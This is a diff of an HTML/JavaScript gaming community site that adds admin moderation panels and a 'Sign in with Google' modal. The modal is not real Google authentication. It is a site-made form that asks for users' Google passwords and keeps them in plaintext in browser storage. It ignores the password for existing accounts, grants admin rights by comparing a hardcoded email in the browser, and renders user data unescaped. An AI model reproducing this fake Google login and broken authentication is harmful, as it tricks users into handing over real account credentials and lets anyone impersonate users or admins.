@@ -1151,7 +1151,95 @@
     color: var(--text-secondary);
   }
 
-  /* === NOTIFICATION BADGE STYLES === */
+  /* === ADMIN STYLES === */
+  .admin-badge {
+    background: #ff4757;
+    color: white;
+    padding: 3px 8px;
+    border-radius: 10px;
+    font-size: 0.7rem;
+    font-weight: 600;
+    margin-left: 5px;
+  }
+
+  .admin-controls {
+    display: flex;
+    gap: 10px;
+    margin-top: 10px;
+  }
+
+  .admin-panel {
+    background: rgba(255, 71, 87, 0.1);
+    border-left: 4px solid #ff4757;
+    padding: 15px;
+    border-radius: 10px;
+    margin-bottom: 20px;
+  }
+
+  .admin-panel h3 {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    color: #ff4757;
+    margin-bottom: 10px;
+  }
+
+  .spam-warning {
+    background: rgba(255, 193, 7, 0.1);
+    border-left: 4px solid #ffc107;
+    padding: 15px;
+    border-radius: 10px;
+    margin-bottom: 20px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .stats-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+    gap: 15px;
+    margin-bottom: 20px;
+  }
+
+  .stat-card {
+    background: var(--surface);
+    border-radius: 10px;
+    padding: 15px;
+    text-align: center;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+  }
+
+  .stat-value {
+    font-size: 1.8rem;
+    font-weight: bold;
+    margin-bottom: 5px;
+  }
+
+  .stat-label {
+    color: var(--text-secondary);
+    font-size: 0.8rem;
+  }
+
+  /* === GOOGLE AUTH STYLES === */
+  .btn-google {
+    background: white;
+    color: #444;
+    border: 1px solid #ddd;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 10px 15px;
+    border-radius: 20px;
+    cursor: pointer;
+    font-weight: 500;
+  }
+
+  .btn-google:hover {
+    background: #f5f5f5;
+  }
+
+  /* === NOTIFICATION BADGE === */
   .notification-badge {
     position: absolute;
     top: -5px;
@@ -1159,20 +1247,13 @@
     background: #ff4757;
     color: white;
     border-radius: 50%;
-    width: 20px;
-    height: 20px;
-    font-size: 12px;
+    width: 18px;
+    height: 18px;
+    font-size: 10px;
     display: flex;
     align-items: center;
     justify-content: center;
     font-weight: bold;
-    animation: pulse 2s infinite;
-  }
-  
-  @keyframes pulse {
-    0% { transform: scale(1); }
-    50% { transform: scale(1.1); }
-    100% { transform: scale(1); }
   }
 
   /* === RESPONSIVE DESIGN === */
@@ -1218,6 +1299,10 @@
     .post-btn {
       width: 100%;
     }
+
+    .stats-grid {
+      grid-template-columns: repeat(2, 1fr);
+    }
   }
 
   @media (max-width: 480px) {
@@ -1258,6 +1343,10 @@
     .post-action {
       padding: 5px 8px;
       font-size: 12px;
+    }
+
+    .stats-grid {
+      grid-template-columns: 1fr;
     }
   }
 </style>
@@ -1355,7 +1444,9 @@
   <div class="logo">Gaming Hood</div>
   <div class="user-menu">
     <div class="auth-buttons" id="authButtons">
-      <button onclick="showAuthModal()" style="background: var(--primary); color: white; border: none; padding: 8px 15px; border-radius: 20px; cursor: pointer;">Login</button>
+      <button class="btn-google" onclick="showGoogleAuthModal()">
+        <i class="fab fa-google"></i> Sign in with Google
+      </button>
     </div>
     <div class="user-profile" id="userProfile">
       <div class="avatar" id="userAvatar">
@@ -1391,6 +1482,49 @@
   <!-- Social Feed Section -->
   <div id="socialSection" style="display: none;">
     <div class="social-feed">
+      <!-- Admin Panel -->
+      <div class="admin-panel" id="adminPanel" style="display: none;">
+        <h3><i class="fas fa-shield-alt"></i> Admin Controls</h3>
+        <p>You have full moderation capabilities. Delete spam comments and manage user content to keep the community safe.</p>
+        <div class="admin-controls">
+          <button class="btn btn-primary" onclick="viewReportedContent()">
+            <i class="fas fa-eye"></i> View Reported Content
+          </button>
+          <button class="btn btn-danger" onclick="showBanUserModal()">
+            <i class="fas fa-ban"></i> Ban User
+          </button>
+        </div>
+      </div>
+
+      <!-- Spam Warning -->
+      <div class="spam-warning">
+        <i class="fas fa-exclamation-triangle"></i>
+        <div>
+          <strong>Spam Protection Active:</strong> Our system automatically detects and flags spam content. 
+          Admins can manually remove inappropriate posts.
+        </div>
+      </div>
+
+      <!-- Stats Grid -->
+      <div class="stats-grid">
+        <div class="stat-card">
+          <div class="stat-value">1,247</div>
+          <div class="stat-label">Community Members</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value">56</div>
+          <div class="stat-label">Posts Today</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value">3</div>
+          <div class="stat-label">Spam Blocks</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value">24</div>
+          <div class="stat-label">Active Moderators</div>
+        </div>
+      </div>
+
       <div class="create-post">
         <textarea class="post-input" id="postContent" placeholder="Share your gaming experience, tips, or ask for help..."></textarea>
         <div class="post-actions-bar">
@@ -1438,6 +1572,51 @@
     <h2 style="margin-bottom: 20px;">My Achievements</h2>
     <div id="achievementsGrid" class="grid">
       <!-- Achievements will be loaded here -->
+    </div>
+  </div>
+</div>
+
+<!-- === GOOGLE AUTH MODAL === -->
+<div id="googleAuthModal" class="modal">
+  <div class="modal-content">
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+      <h3>Sign In with Google</h3>
+      <button onclick="closeModal('googleAuthModal')" style="background: none; border: none; font-size: 24px; cursor: pointer;">×</button>
+    </div>
+    <div style="background: rgba(76, 175, 80, 0.1); padding: 15px; border-radius: 10px; margin-bottom: 20px; border-left: 4px solid #4CAF50;">
+      <i class="fas fa-info-circle"></i> We require Google authentication to ensure a safe community environment and prevent spam accounts.
+    </div>
+    <div style="margin-bottom: 20px;">
+      <label style="display: block; margin-bottom: 8px; font-weight: 600;">Google Account</label>
+      <input type="email" id="googleEmail" class="form-control" placeholder="your.email@gmail.com" style="width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #ccc; background: var(--surface); color: var(--text);">
+    </div>
+    <div style="margin-bottom: 20px;">
+      <label style="display: block; margin-bottom: 8px; font-weight: 600;">Password</label>
+      <input type="password" id="googlePassword" class="form-control" placeholder="Your Google password" style="width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #ccc; background: var(--surface); color: var(--text);">
+    </div>
+    <button onclick="authenticateWithGoogle()" style="width: 100%; padding: 12px; background: linear-gradient(45deg, var(--primary), var(--secondary)); color: white; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 8px;">
+      <i class="fab fa-google"></i> Continue with Google
+    </button>
+    <p style="text-align: center; margin-top: 15px; color: var(--text-secondary);">
+      By continuing, you agree to our <a href="#" style="color: var(--primary);">Community Guidelines</a>
+    </p>
+  </div>
+</div>
+
+<!-- === DELETE CONFIRMATION MODAL === -->
+<div id="deleteModal" class="modal">
+  <div class="modal-content">
+    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+      <h3>Delete Comment</h3>
+      <button onclick="closeModal('deleteModal')" style="background: none; border: none; font-size: 24px; cursor: pointer;">×</button>
+    </div>
+    <div style="background: rgba(255, 71, 87, 0.1); padding: 15px; border-radius: 10px; margin-bottom: 20px; border-left: 4px solid #ff4757;">
+      <i class="fas fa-exclamation-triangle"></i> You are about to delete this comment. This action cannot be undone.
+    </div>
+    <p>Are you sure you want to delete this comment? The user will be notified that their content was removed for violating community guidelines.</p>
+    <div style="display: flex; gap: 10px; margin-top: 20px;">
+      <button onclick="closeModal('deleteModal')" style="flex: 1; background: var(--gray); color: white; border: none; padding: 12px; border-radius: 10px; cursor: pointer;">Cancel</button>
+      <button onclick="confirmDelete()" style="flex: 1; background: #ff4757; color: white; border: none; padding: 12px; border-radius: 10px; cursor: pointer;">Delete Comment</button>
     </div>
   </div>
 </div>
@@ -1495,6 +1674,7 @@
 <audio id="postSound" preload="auto"><source src="https://assets.mixkit.co/sfx/preview/mixkit-unlock-game-notification-253.mp3" type="audio/mpeg"></audio>
 
 <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
 <script>
 // === GAMING HOOD - COMPLETE WITH ALL FEATURES ===
 
@@ -1537,10 +1717,6 @@ let achievements = JSON.parse(localStorage.getItem('achievements')) || {};
 let socialPosts = JSON.parse(localStorage.getItem('socialPosts')) || [];
 let avatarFile = null;
 
-// === NOTIFICATION SYSTEM ===
-let notifications = JSON.parse(localStorage.getItem('notifications')) || [];
-let unreadNotifications = JSON.parse(localStorage.getItem('unreadNotifications')) || 0;
-
 // === ADMIN CONTROLS ===
 const ADMIN_EMAIL = 'haisboy4@gmail.com';
 
@@ -1576,9 +1752,6 @@ async function initializeApp() {
   
   // Initialize user interface
   updateUserInterface();
-  
-  // Update notification badge
-  updateNotificationBadge();
 }
 
 // === CSV LOADING ===
@@ -1654,7 +1827,81 @@ function displayGames(games) {
   
   console.log('Displaying games:', games.length);
   
-  grid.innerHTML = games.map(game => createGameCard(game, favorites.includes(game.id))).join('');
+  grid.innerHTML = games.map(game => {
+    const isFavorite = favorites.includes(game.id);
+    const userRating = currentUser ? (gameRatings[game.id + '_users']?.[currentUser.id] || 0) : 0;
+    const averageRating = game.rating;
+    
+    return `
+      <div class="flip-card" onclick="flipCard(this)">
+        <div class="flip-card-inner">
+          <div class="flip-card-front">
+            <button class="favorite-btn ${isFavorite ? 'active' : ''}" 
+                    onclick="event.stopPropagation(); toggleFavorite('${game.id}')">
+              ${isFavorite ? '❤️' : '🤍'}
+            </button>
+            <img src="${game.image}" alt="${game.name}" 
+                 onerror="this.src='https://via.placeholder.com/160x140/666/white?text=🎮'">
+            <div class="info">
+              <h3>${game.name}</h3>
+              <p>${game.Platform}</p>
+              <div class="rating-container">
+                <div class="star-rating">
+                  ${[1,2,3,4,5].map(star => 
+                    `<span class="star ${star <= userRating ? 'active' : ''} ${star <= Math.round(averageRating) ? 'community-rated' : ''}" 
+                          onclick="event.stopPropagation(); rateGame('${game.id}', ${star})">⭐</span>`
+                  ).join('')}
+                </div>
+                <div class="rating-text">
+                  ${averageRating > 0 ? `⭐ ${averageRating.toFixed(1)}/5 (${game.ratingCount})` : 'Not rated yet'}
+                  ${userRating > 0 ? `<br><small>Your: ${userRating}/5</small>` : ''}
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="flip-card-back">
+            <h3>${game.name}</h3>
+            <p>${game.Platform}</p>
+            
+            <div class="game-stats">
+              <div class="stat">
+                <div class="stat-value">${averageRating > 0 ? averageRating.toFixed(1) : '-'}</div>
+                <div class="stat-label">Rating</div>
+              </div>
+              <div class="stat">
+                <div class="stat-value">${game.ratingCount}</div>
+                <div class="stat-label">Votes</div>
+              </div>
+              <div class="stat">
+                <div class="stat-value">${isFavorite ? '❤️' : '🤍'}</div>
+                <div class="stat-label">Favorite</div>
+              </div>
+            </div>
+
+            <a class="btn btn-primary" href="${game.link}" target="_blank" onclick="event.stopPropagation()">
+              🎮 Download Now
+            </a>
+            
+            ${currentUser ? `
+              <div class="btn" onclick="event.stopPropagation(); showAddToCollection('${game.id}')">
+                📚 Add to Collection
+              </div>
+              
+              <div class="rating-container">
+                <small>Rate this game:</small>
+                <div class="star-rating">
+                  ${[1,2,3,4,5].map(star => 
+                    `<span class="star ${star <= userRating ? 'active' : ''}" 
+                          onclick="event.stopPropagation(); rateGame('${game.id}', ${star})">⭐</span>`
+                  ).join('')}
+                </div>
+              </div>
+            ` : ''}
+          </div>
+        </div>
+      </div>
+    `;
+  }).join('');
 }
 
 // === FIXED TOP-RATED SECTION ===
@@ -1813,6 +2060,14 @@ function createGameCard(game, isFavorite = false) {
 function displaySocialFeed() {
   const postsContainer = document.getElementById('postsContainer');
   
+  // Show admin panel if user is admin
+  const adminPanel = document.getElementById('adminPanel');
+  if (isAdmin()) {
+    adminPanel.style.display = 'block';
+  } else {
+    adminPanel.style.display = 'none';
+  }
+  
   if (socialPosts.length === 0) {
     postsContainer.innerHTML = `
       <div class="no-posts">
@@ -1951,6 +2206,132 @@ function displaySocialFeed() {
   }).join('');
 }
 
+// === ADMIN FUNCTIONS ===
+function banUser(userId) {
+  if (!isAdmin()) return;
+  
+  const userToBan = Object.values(userDatabase).find(user => user.id === userId);
+  if (!userToBan) return;
+  
+  if (confirm(`Are you sure you want to ban user "${userToBan.name}" (${userToBan.email})? This will delete all their posts and comments.`)) {
+    // Remove user's posts
+    socialPosts = socialPosts.filter(post => post.userId !== userId);
+    
+    // Remove user's comments from all posts
+    socialPosts.forEach(post => {
+      post.comments = post.comments.filter(comment => comment.userId !== userId);
+    });
+    
+    // Remove user from database
+    delete userDatabase[userToBan.email];
+    
+    // Save changes
+    localStorage.setItem('socialPosts', JSON.stringify(socialPosts));
+    localStorage.setItem('userDatabase', JSON.stringify(userDatabase));
+    
+    // Refresh feed
+    displaySocialFeed();
+    
+    alert(`User "${userToBan.name}" has been banned and all their content removed.`);
+  }
+}
+
+function viewReportedContent() {
+  if (!isAdmin()) return;
+  alert('Admin feature: Viewing reported content...');
+  // In a real app, this would filter and show reported posts
+}
+
+function showBanUserModal() {
+  if (!isAdmin()) return;
+  alert('Admin feature: Ban user modal would open here');
+  // In a real app, this would show a modal to select and ban users
+}
+
+// === GOOGLE AUTHENTICATION ===
+function showGoogleAuthModal() {
+  closeSidebar();
+  document.getElementById('googleAuthModal').style.display = 'block';
+}
+
+function authenticateWithGoogle() {
+  const email = document.getElementById('googleEmail').value;
+  const password = document.getElementById('googlePassword').value;
+  
+  if (!email || !password) {
+    alert('Please enter both email and password!');
+    return;
+  }
+  
+  // Validate Google email
+  if (!isValidGoogleEmail(email)) {
+    alert('Please use a valid Google account (Gmail address) to register. This helps us maintain a safe community.');
+    return;
+  }
+  
+  // In a real app, this would validate with Google's API
+  // For demo purposes, we'll simulate successful authentication
+  
+  // Check if user exists or create new one
+  let user = userDatabase[email];
+  if (!user) {
+    // Create new user
+    const userId = Date.now().toString();
+    user = {
+      id: userId,
+      name: email.split('@')[0],
+      email: email,
+      password: password, // In real app, this would be handled by Google
+      avatar: email[0].toUpperCase(),
+      avatarUrl: null,
+      joinDate: new Date().toISOString()
+    };
+    userDatabase[email] = user;
+    localStorage.setItem('userDatabase', JSON.stringify(userDatabase));
+  }
+  
+  // Set current user
+  currentUser = {
+    id: user.id,
+    name: user.name,
+    email: user.email,
+    avatar: user.avatar,
+    avatarUrl: user.avatarUrl,
+    joinDate: user.joinDate
+  };
+  
+  localStorage.setItem('currentUser', JSON.stringify(currentUser));
+  updateUserInterface();
+  closeModal('googleAuthModal');
+  
+  // Clear form
+  document.getElementById('googleEmail').value = '';
+  document.getElementById('googlePassword').value = '';
+  
+  // Show admin controls if admin
+  if (isAdmin()) {
+    showAdminFeatures();
+  }
+  
+  unlockAchievement('welcome', 'Welcome to the Hood!', 'You joined Gaming Hood!');
+}
+
+function isValidGoogleEmail(email) {
+  // Basic Gmail validation
+  const gmailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@gmail\.com$/;
+  return gmailRegex.test(email.toLowerCase());
+}
+
+function showAdminFeatures() {
+  // Update UI to show admin features
+  document.querySelector('.logo').innerHTML += ' <span class="admin-badge">ADMIN</span>';
+  
+  // Update user profile to show admin status
+  if (document.getElementById('sidebarUserName')) {
+    document.getElementById('sidebarUserName').innerHTML += ' <span class="admin-badge">ADMIN</span>';
+  }
+}
+
 // === SOCIAL FEED FUNCTIONALITY ===
 function updateGameSelect() {
   const gameSelect = document.getElementById('postGameSelect');
@@ -1960,7 +2341,7 @@ function updateGameSelect() {
 
 function createPost() {
   if (!currentUser) {
-    showAuthModal();
+    showGoogleAuthModal();
     return;
   }
   
@@ -2002,7 +2383,7 @@ function createPost() {
 
 function toggleLike(postId) {
   if (!currentUser) {
-    showAuthModal();
+    showGoogleAuthModal();
     return;
   }
   
@@ -2010,18 +2391,11 @@ function toggleLike(postId) {
   if (!post) return;
   
   const userIndex = post.likes.indexOf(currentUser.id);
-  const wasLiked = userIndex > -1;
-  
-  if (wasLiked) {
+  if (userIndex > -1) {
     post.likes.splice(userIndex, 1);
   } else {
     post.likes.push(currentUser.id);
     playSound('favoriteSound');
-    
-    // Notify post owner if it's not their own post
-    if (post.userId !== currentUser.id) {
-      addNotification('like', `${currentUser.name} liked your post`, '❤️');
-    }
   }
   
   localStorage.setItem('socialPosts', JSON.stringify(socialPosts));
@@ -2039,7 +2413,7 @@ function toggleComments(postId) {
 
 function addComment(postId) {
   if (!currentUser) {
-    showAuthModal();
+    showGoogleAuthModal();
     return;
   }
   
@@ -2068,11 +2442,6 @@ function addComment(postId) {
   
   // Keep comments section open
   document.getElementById(`comments-${postId}`).style.display = 'block';
-  
-  // Notify post owner if it's not their own post
-  if (post.userId !== currentUser.id) {
-    addNotification('comment', `${currentUser.name} commented on your post`, '💬');
-  }
 }
 
 function sharePost(postId) {
@@ -2104,7 +2473,7 @@ function sharePost(postId) {
 // 🎉 SURPRISE FEATURE: Post Reactions
 function addReaction(postId, reaction) {
   if (!currentUser) {
-    showAuthModal();
+    showGoogleAuthModal();
     return;
   }
   
@@ -2130,7 +2499,7 @@ function addReaction(postId, reaction) {
 // 🎉 SURPRISE FEATURE: Save Posts
 function toggleSavePost(postId) {
   if (!currentUser) {
-    showAuthModal();
+    showGoogleAuthModal();
     return;
   }
   
@@ -2213,6 +2582,8 @@ function editComment(postId, commentId) {
   }
 }
 
+let commentToDelete = null;
+
 function deleteComment(postId, commentId, isAdminDelete = false) {
   if (!currentUser && !isAdminDelete) return;
   
@@ -2229,11 +2600,17 @@ function deleteComment(postId, commentId, isAdminDelete = false) {
     return;
   }
   
-  const confirmMessage = isAdminDelete 
-    ? `Delete comment by "${comment.userName}" as admin?`
-    : 'Are you sure you want to delete this comment?';
+  commentToDelete = { postId, commentId, isAdminDelete };
+  document.getElementById('deleteModal').style.display = 'block';
+}
+
+function confirmDelete() {
+  if (!commentToDelete) return;
   
-  if (confirm(confirmMessage)) {
+  const { postId, commentId, isAdminDelete } = commentToDelete;
+  const post = socialPosts.find(p => p.id === postId);
+  
+  if (post) {
     post.comments = post.comments.filter(c => c.id !== commentId);
     localStorage.setItem('socialPosts', JSON.stringify(socialPosts));
     displaySocialFeed();
@@ -2243,9 +2620,13 @@ function deleteComment(postId, commentId, isAdminDelete = false) {
     
     // Add notification for admin actions
     if (isAdminDelete) {
-      addNotification('admin_action', `Removed comment by ${comment.userName}`, '👑');
+      // In a real app, this would send a notification
+      console.log('Admin deleted a comment');
     }
   }
+  
+  closeModal('deleteModal');
+  commentToDelete = null;
 }
 
 // === POST EDITING & DELETION ===
@@ -2310,83 +2691,10 @@ function getTimeAgo(timestamp) {
   return postTime.toLocaleDateString();
 }
 
-// === ADMIN FUNCTIONS ===
-function banUser(userId) {
-  if (!isAdmin()) return;
-  
-  const userToBan = Object.values(userDatabase).find(user => user.id === userId);
-  if (!userToBan) return;
-  
-  if (confirm(`Are you sure you want to ban user "${userToBan.name}" (${userToBan.email})? This will delete all their posts and comments.`)) {
-    // Remove user's posts
-    socialPosts = socialPosts.filter(post => post.userId !== userId);
-    
-    // Remove user's comments from all posts
-    socialPosts.forEach(post => {
-      post.comments = post.comments.filter(comment => comment.userId !== userId);
-    });
-    
-    // Remove user from database
-    delete userDatabase[userToBan.email];
-    
-    // Save changes
-    localStorage.setItem('socialPosts', JSON.stringify(socialPosts));
-    localStorage.setItem('userDatabase', JSON.stringify(userDatabase));
-    
-    // Refresh feed
-    displaySocialFeed();
-    
-    alert(`User "${userToBan.name}" has been banned and all their content removed.`);
-  }
-}
-
-// === GOOGLE AUTHENTICATION REQUIREMENT ===
-function register() {
-  const name = document.getElementById('registerName').value;
-  const email = document.getElementById('registerEmail').value;
-  const password = document.getElementById('registerPassword').value;
-  
-  if (!name || !email || !password) {
-    alert('Please fill in all fields!');
-    return;
-  }
-  
-  // Validate Google email
-  if (!isValidGoogleEmail(email)) {
-    alert('Please use a valid Google account (Gmail address) to register. This helps us maintain a safe community.');
-    return;
-  }
-  
-  if (userDatabase[email]) {
-    alert('Email already registered! Please login instead.');
-    showLogin();
-    return;
-  }
-  
-  // Create new user
-  const userId = Date.now().toString();
-  let avatarUrl = null;
-  
-  // Handle avatar upload
-  if (avatarFile) {
-    const reader = new FileReader();
-    reader.onload = function(e) {
-      avatarUrl = e.target.result;
-      completeRegistration(userId, name, email, password, avatarUrl);
-    };
-    reader.readAsDataURL(avatarFile);
-  } else {
-    completeRegistration(userId, name, email, password, null);
-  }
-}
-
-function isValidGoogleEmail(email) {
-  // Basic Gmail validation - you can enhance this with more sophisticated checks
-  const gmailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@gmail\.com$/;
-  return gmailRegex.test(email.toLowerCase());
-}
-
 // === NOTIFICATION SYSTEM ===
+let notifications = JSON.parse(localStorage.getItem('notifications')) || [];
+let unreadNotifications = JSON.parse(localStorage.getItem('unreadNotifications')) || 0;
+
 function addNotification(type, message, icon = '🔔') {
   const notification = {
     id: 'notification_' + Date.now(),
@@ -2447,22 +2755,6 @@ function updateNotificationBadge() {
     const badge = document.createElement('span');
     badge.className = 'notification-badge';
     badge.textContent = unreadNotifications > 99 ? '99+' : unreadNotifications;
-    badge.style.cssText = `
-      position: absolute;
-      top: -5px;
-      right: -5px;
-      background: #ff4757;
-      color: white;
-      border-radius: 50%;
-      width: 20px;
-      height: 20px;
-      font-size: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: bold;
-    `;
-    socialNavItem.style.position = 'relative';
     socialNavItem.appendChild(badge);
   }
 }
@@ -2544,7 +2836,7 @@ function displayCollections() {
 
 function showCreateCollectionModal() {
   if (!currentUser) {
-    showAuthModal();
+    showGoogleAuthModal();
     return;
   }
   document.getElementById('collectionName').value = '';
@@ -2654,7 +2946,7 @@ function addToCollection(collectionId, gameId) {
 
 function showAddToCollection(gameId) {
   if (!currentUser) {
-    showAuthModal();
+    showGoogleAuthModal();
     return;
   }
   
@@ -2705,7 +2997,7 @@ function deleteCollection(collectionId) {
 function showAchievementsSection() {
   if (!currentUser) {
     alert('Please login to view achievements!');
-    showAuthModal();
+    showGoogleAuthModal();
     return;
   }
   
@@ -2802,6 +3094,39 @@ function login() {
   }
 }
 
+function register() {
+  const name = document.getElementById('registerName').value;
+  const email = document.getElementById('registerEmail').value;
+  const password = document.getElementById('registerPassword').value;
+  
+  if (!name || !email || !password) {
+    alert('Please fill in all fields!');
+    return;
+  }
+  
+  if (userDatabase[email]) {
+    alert('Email already registered! Please login instead.');
+    showLogin();
+    return;
+  }
+  
+  // Create new user
+  const userId = Date.now().toString();
+  let avatarUrl = null;
+  
+  // Handle avatar upload
+  if (avatarFile) {
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      avatarUrl = e.target.result;
+      completeRegistration(userId, name, email, password, avatarUrl);
+    };
+    reader.readAsDataURL(avatarFile);
+  } else {
+    completeRegistration(userId, name, email, password, null);
+  }
+}
+
 function completeRegistration(userId, name, email, password, avatarUrl) {
   userDatabase[email] = {
     id: userId,
@@ -2856,6 +3181,11 @@ function updateUserInterface() {
     document.getElementById('sidebarUserEmail').textContent = currentUser.email;
     
     updateAvatarDisplay();
+    
+    // Show admin features if admin
+    if (isAdmin()) {
+      showAdminFeatures();
+    }
   } else {
     document.getElementById('authButtons').style.display = 'flex';
     document.getElementById('userProfile').style.display = 'none';
@@ -2907,7 +3237,7 @@ function flipCard(card) {
 
 function toggleFavorite(gameId) {
   if (!currentUser) {
-    showAuthModal();
+    showGoogleAuthModal();
     return;
   }
   
@@ -2962,7 +3292,7 @@ function feelingLucky() {
 // === FIXED RATING SYSTEM ===
 function rateGame(gameId, rating) {
   if (!currentUser) {
-    showAuthModal();
+    showGoogleAuthModal();
     return;
   }
   
